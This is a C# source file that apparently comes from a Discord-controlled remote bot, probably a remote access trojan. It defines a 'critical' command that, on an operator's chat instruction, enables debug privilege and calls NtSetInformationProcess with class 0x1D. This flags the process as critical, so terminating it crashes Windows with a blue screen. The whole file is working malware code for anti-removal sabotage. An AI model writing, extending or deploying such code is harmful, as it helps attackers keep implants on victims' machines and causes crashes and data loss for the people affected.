using Discord;
using Discord.Commands;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Main.Source.Bot.Commands
{
    public class Critical : CommandBase
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(
            IntPtr hProcess,
            int processInformationClass,
            ref int processInformation,
            int processInformationLength
        );

        public override string Name => "critical";
        public override string Info => "Makes the process trigger the blue screen of death when terminated";
        public override string Use => "on | off";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length != 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            if (args[0] == "on")
            {
                int critical = 1;

                Process.EnterDebugMode();

                NtSetInformationProcess(
                    Process.GetCurrentProcess().Handle,
                    0x1D,
                    ref critical,
                    sizeof(int)
                );
            }
            else if (args[0] == "off")
            {
                int critical = 0;

                Process.EnterDebugMode();

                NtSetInformationProcess(
                    Process.GetCurrentProcess().Handle,
                    0x1D,
                    ref critical,
                    sizeof(int)
                );
            }
            else
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
            }
        }
    }
}
